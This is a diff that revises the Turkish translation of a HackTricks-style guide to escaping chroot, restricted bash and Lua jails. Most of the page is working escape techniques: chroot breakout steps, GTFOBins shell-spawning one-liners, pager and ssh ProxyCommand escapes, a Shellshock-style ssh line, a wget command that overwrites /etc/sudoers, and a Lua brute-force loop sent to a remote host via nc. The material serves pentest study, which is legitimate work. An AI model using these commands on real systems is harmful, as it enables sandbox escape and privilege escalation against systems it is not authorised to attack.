@@ -1,27 +1,27 @@
-# Jailer'dan Kaçış
+# Jails'ten Kaçış
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## **GTFOBins**
 
-**"Shell" özelliğine sahip herhangi bir ikili dosyayı çalıştırıp çalıştıramayacağınızı** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **adresinde arayın**
+Eğer "Shell" özelliğine sahip herhangi bir binary çalıştırabiliyorsanız [**https://gtfobins.github.io/**](https://gtfobins.github.io) **adresinde arayın**
 
 ## Chroot Kaçışları
 
-[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) adresinden: Chroot mekanizması, **yetkili** (**root**) **kullanıcılar** tarafından kasıtlı müdahalelere karşı **savunma yapmak için** tasarlanmamıştır. Çoğu sistemde, chroot bağlamları düzgün bir şekilde yığılmamaktadır ve yeterli ayrıcalıklara sahip chroot edilmiş programlar **çıkmak için ikinci bir chroot gerçekleştirebilir**.\
-Genellikle bu, kaçış yapmak için chroot içinde root olmanız gerektiği anlamına gelir.
+[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: chroot mekanizması, **ayrıcalıklı** (**root**) **kullanıcılar** tarafından yapılan kasıtlı kurcalamalara karşı **koruma amacıyla tasarlanmamıştır**. Çoğu sistemde chroot context'leri düzgün şekilde üst üste binmez ve yeterli ayrıcalıklara sahip chrooted programlar **dışarı çıkmak için ikinci bir chroot gerçekleştirebilir**.\
+Genellikle bu, kaçış için chroot içinde root olmanız gerektiği anlamına gelir.
 
 > [!TIP]
-> **chw00t** [**aracı**](https://github.com/earthquake/chw00t), aşağıdaki senaryoları kötüye kullanmak ve `chroot`'dan kaçmak için oluşturulmuştur.
+> [**chw00t**](https://github.com/earthquake/chw00t) **tool**'u, aşağıdaki escenario'ları kötüye kullanmak ve `chroot`'tan kaçmak için oluşturuldu.
 
 ### Root + CWD
 
 > [!WARNING]
-> Eğer bir chroot içinde **root** iseniz, **başka bir chroot** oluşturarak **kaçabilirsiniz**. Bunun nedeni, 2 chroot'un (Linux'ta) bir arada var olamayacağıdır, bu nedenle bir klasör oluşturup ardından **o yeni klasörde yeni bir chroot oluşturursanız** ve **dışında olursanız**, artık **yeni chroot'un dışındasınız** ve dolayısıyla FS'de olacaksınız.
+> Bir chroot içinde **root** iseniz, başka bir chroot oluşturarak **kaçabilirsiniz**. Bunun nedeni, 2 chroot'un (Linux'ta) bir arada bulunamamasıdır; bu yüzden bir klasör oluşturup ardından bu yeni klasör üzerinde, siz onun **dışındayken**, **yeni bir chroot** oluşturursanız, artık **yeni chroot'un dışında** olursunuz ve dolayısıyla FS içinde olursunuz.
 >
-> Bu, genellikle chroot'un çalışma dizininizi belirtilen yere taşımadığı için olur, bu nedenle bir chroot oluşturabilirsiniz ama onun dışında olursunuz.
+> Bu, genellikle chroot'un çalışma dizininizi belirtilen yere taşımamasından kaynaklanır; bu yüzden siz dışındayken bir chroot oluşturabilirsiniz.
 
-Genellikle bir chroot hapishanesinde `chroot` ikili dosyasını bulamazsınız, ancak bir ikili dosyayı **derleyip, yükleyip ve çalıştırabilirsiniz**:
+Genellikle chroot jail içinde `chroot` binary'sini bulamazsınız, ancak bir binary'yi **compile, upload and execute** edebilirsiniz:
 
 <details>
 
@@ -76,10 +76,10 @@ system("/bin/bash");
 ```
 </details>
 
-### Root + Kaydedilmiş fd
+### Root + Saved fd
 
 > [!WARNING]
-> Bu, önceki duruma benzer, ancak bu durumda **saldırgan mevcut dizine bir dosya tanımlayıcısı kaydediyor** ve ardından **yeni bir klasörde chroot oluşturuyor**. Son olarak, chroot'un **dışında** o **FD**'ye **erişimi** olduğu için ona erişiyor ve **kaçıyor**.
+> Bu, önceki duruma benzer, ancak bu durumda **saldırgan geçerli dizine bir file descriptor kaydeder** ve ardından **chroot'u yeni bir klasörde oluşturur**. Son olarak, **chroot dışında** o **FD**'ye **erişimi** olduğundan, ona erişir ve **kaçar**.
 
 <details>
 
@@ -109,21 +109,21 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 > [!WARNING]
-> FD, Unix Domain Sockets üzerinden geçirilebilir, bu yüzden:
+> FD Unix Domain Sockets üzerinden aktarılabilir, bu yüzden:
 >
-> - Bir çocuk işlem oluştur (fork)
-> - Ebeveyn ve çocuk arasında iletişim kurmak için UDS oluştur
-> - Çocuk işlemde farklı bir klasörde chroot çalıştır
-> - Ebeveyn işlemde, yeni çocuk işlem chroot'unun dışında bir klasörün FD'sini oluştur
-> - Bu FD'yi UDS kullanarak çocuk işleme geçir
-> - Çocuk işlem bu FD'ye chdir yapar ve çünkü chroot'unun dışındadır, hapisten kaçacaktır
+> - Bir child process oluştur (fork)
+> - Parent ve child'ın konuşabilmesi için UDS oluştur
+> - Child process içinde farklı bir klasörde chroot çalıştır
+> - Parent proc içinde, yeni child proc chroot'unun dışında kalan bir klasörün FD'sini oluştur
+> - Bu FD'yi UDS kullanarak child procc'a aktar
+> - Child process o FD'ye chdir yapar ve bu, kendi chroot'unun dışında olduğu için jail'den escape eder
 
 ### Root + Mount
 
 > [!WARNING]
 >
-> - Kök cihazı (/) chroot'un içindeki bir dizine monte et
-> - O dizine chroot yap
+> - Root device (/) bir dizinin içine, chroot'un içindeki bir klasöre mount etmek
+> - O klasöre chroot etmek
 >
 > Bu Linux'ta mümkündür
 
@@ -131,66 +131,109 @@ chroot(".");
 
 > [!WARNING]
 >
-> - procfs'i chroot'un içindeki bir dizine monte et (henüz değilse)
-> - Farklı bir root/cwd girişi olan bir pid ara, örneğin: /proc/1/root
-> - O girişe chroot yap
+> - procfs'i chroot içindeki bir klasöre mount et (eğer henüz mount edilmemişse)
+> - /proc/1/root gibi farklı bir root/cwd girdisi olan bir pid ara
+> - O girdiye chroot et
 
 ### Root(?) + Fork
 
 > [!WARNING]
 >
-> - Bir Fork (çocuk işlem) oluştur ve FS'de daha derin bir klasöre chroot yap ve oraya CD yap
-> - Ebeveyn işlemden, çocuk işlemin bulunduğu klasörü çocukların chroot'unun öncesindeki bir klasöre taşı
-> - Bu çocuk işlem kendini chroot'un dışında bulacaktır
+> - Bir Fork (child proc) oluştur ve FS içinde daha derin farklı bir klasöre chroot edip orada CD yap
+> - Parent process'ten, child process'in içinde olduğu klasörü çocukların chroot'undan önceki bir klasöre taşı
+> - Bu child process kendini chroot'un dışında bulacaktır
 
 ### ptrace
 
 > [!WARNING]
 >
-> - Bir zamanlar kullanıcılar kendi işlemlerini kendi süreçlerinden hata ayıklayabiliyordu... ama bu artık varsayılan olarak mümkün değil
-> - Yine de, mümkünse, bir işleme ptrace yapabilir ve içinde bir shellcode çalıştırabilirsin ([bu örneğe bak](linux-capabilities.md#cap_sys_ptrace)).
+> - Bir zamanlar kullanıcılar kendi proseslerini yine kendi proseslerinden debug edebiliyordu... ama bu artık varsayılan olarak mümkün değil
+> - Yine de, eğer mümkünse, bir prosese ptrace yapıp onun içinde bir shellcode çalıştırabilirsin ([bu örneğe bak](linux-capabilities.md#cap_sys_ptrace)).
 
 ## Bash Jails
 
 ### Enumeration
 
-Hapishane hakkında bilgi al:
+Jail hakkında bilgi al:
 ```bash
+echo $0
 echo $SHELL
 echo $PATH
 env
 export
 pwd
+set -o
+compgen -c | sort -u
+enable -a
+type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
 ```
-### PATH'i Değiştir
+### PATH’i Değiştir
 
-PATH ortam değişkenini değiştirip değiştiremeyeceğinizi kontrol edin.
+PATH env variable’ını değiştirebiliyor musun diye kontrol et
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### vim Kullanımı
+### vim kullanarak
 ```bash
 :set shell=/bin/sh
 :shell
 ```
+### Pager'lar ve yardım görüntüleyicileri
+
+Birçok kısıtlı ortam hâlâ **pager**'ları veya **help viewers**'ı kullanılabilir bırakır. Bunlar genelde `PATH`'i yeniden oluşturmaya çalışmaktan daha hızlı suistimal edilir.
+```bash
+less /etc/hosts
+!/bin/sh
+
+man man
+!/bin/sh
+
+man '-H/bin/sh #' man
+```
+Eğer `git` kullanılabiliyorsa, yardım çıktısının genellikle bir pager üzerinden geçtiğini unutmayın:
+```bash
+PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+# Or: git help config
+# Then inside the pager: !/bin/sh
+```
+### Yaygın GTFOBins tek satırlıkları
+
+Hangi binary'lere erişilebildiğini öğrendikten sonra, önce bariz shell spawner'ları test edin:
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+find . -exec /bin/sh \; -quit
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
+script /dev/null -c bash
+ssh localhost /bin/sh
+```
+Eğer sadece izin verilen bir komuta **arguments enjekte** edebiliyorsanız (onu serbestçe çalıştırmak yerine), **GTFOArgs**’ı da kontrol edin.
+
 ### Script oluştur
 
-_/bin/bash_ içeriği ile çalıştırılabilir bir dosya oluşturup oluşturamayacağını kontrol et
+İçeriği _/bin/bash_ olan çalıştırılabilir bir dosya oluşturup oluşturamadığınızı kontrol edin
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### SSH Üzerinden Bash Elde Etme
+### SSH üzerinden bash alın
 
-Eğer ssh üzerinden erişiyorsanız, bir bash shell'i çalıştırmak için bu hileyi kullanabilirsiniz:
+Eğer ssh ile erişiyorsanız, çoğu zaman sunucudan kısıtlı giriş shell’i yerine **farklı bir program** çalıştırmasını isteyebilirsiniz:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
+ssh user@<IP> -t "/bin/sh"
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-### Beyan Et
+Eğer `ssh` yerel olarak izin verilen birkaç binary’den biriyse, bunun aynı zamanda bir **GTFOBin** olarak da kötüye kullanılabileceğini unutmayın:
+```bash
+ssh localhost /bin/sh
+ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+```
+### Declare
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
@@ -198,17 +241,28 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-Örneğin sudoers dosyasını üzerine yazabilirsiniz.
+Örneğin sudoers dosyasının üzerine yazabilirsiniz
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### Diğer hileler
+### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)
 
-[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
-**Sayfa da ilginç olabilir:**
+Bazı ortamlarda sizi düz `rbash` içine değil, `git-shell`, `rssh` veya `lshell` gibi **wrappers** içine bırakırlar:
 
+- `git-shell` yalnızca server-side Git commands ve `~/git-shell-commands/` içindeki şeyleri kabul eder. Eğer bu dizin varsa, izin verilen custom actions'ları listelemek için `help` çalıştırın. Oraya **write** yapabiliyorsanız, bu dizine bırakılan herhangi bir executable erişilebilir olur.
+- `rssh` / `lshell` genellikle yalnızca `scp`, `sftp`, `rsync` veya Git-style operations'a izin verir. Bu durumlarda önce **file write primitives** üzerine odaklanın: `authorized_keys`, bir shell startup file veya bir helper script'i writable bir konuma upload edin ve ardından `ssh -t ...` ile yeniden bağlanın.
+- Eğer wrapper yalnızca command line'ı filtreliyorsa, erişilebilen binaries'leri enumerate edin ve ardından **GTFOBins / GTFOArgs**'a geri dönün.
+
+### Diğer taktikler
+
+Ayrıca şunlara da bakın:
+
+- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
+- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
+- [**GTFOBins**](https://gtfobins.org/)
+- [**GTFOArgs**](https://gtfoargs.github.io/)
+
+**Şu sayfa da ilginç olabilir:**
 
 {{#ref}}
 ../bypass-bash-restrictions/
@@ -216,7 +270,7 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 
 ## Python Jails
 
-Python hapishanelerinden kaçış hakkında hileler aşağıdaki sayfada:
+Aşağıdaki sayfada python jails'ten kaçış hakkında taktikler var:
 
 
 {{#ref}}
@@ -225,22 +279,22 @@ Python hapishanelerinden kaçış hakkında hileler aşağıdaki sayfada:
 
 ## Lua Jails
 
-Bu sayfada lua içinde erişebileceğiniz global fonksiyonları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+Bu sayfada lua içinde erişiminiz olan global functions'ları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
 
-**Komut yürütme ile Eval:**
+**Eval with command execution:**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-Bir kütüphanenin **nokta kullanmadan fonksiyonlarını çağırmanın bazı hileleri**:
+Bir library’nin fonksiyonlarını **dot kullanmadan çağırmak** için bazı tricks:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-Bir kütüphanenin işlevlerini listele:
+Bir library'nin fonksiyonlarını enumerate et:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-Not edin ki, önceki tek satırı **farklı bir lua ortamında her çalıştırdığınızda fonksiyonların sırası değişir**. Bu nedenle, belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua ortamlarını yükleyerek ve le library'nin ilk fonksiyonunu çağırarak bir kaba kuvvet saldırısı gerçekleştirebilirsiniz:
+Not: Önceki tek satırlık komutu **farklı bir lua environment** içinde her çalıştırdığınızda **fonksiyonların sırası değişir**. Bu nedenle belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua environments yükleyerek ve le library’nin ilk fonksiyonunu çağırarak bir brute force attack gerçekleştirebilirsiniz:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -251,12 +305,14 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Etkileşimli lua shell alın**: Eğer sınırlı bir lua shell içindeyseniz, yeni bir lua shell (ve umarım sınırsız) almak için şunu çağırabilirsiniz:
+**Etkileşimli lua shell al**: Eğer kısıtlı bir lua shell içindeyseniz, şu komutu çağırarak yeni bir lua shell (ve umarım sınırsız) elde edebilirsiniz:
 ```bash
 debug.debug()
 ```
 ## Referanslar
 
 - [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
+- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
+- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)
 
 {{#include ../../banners/hacktricks-training.md}}
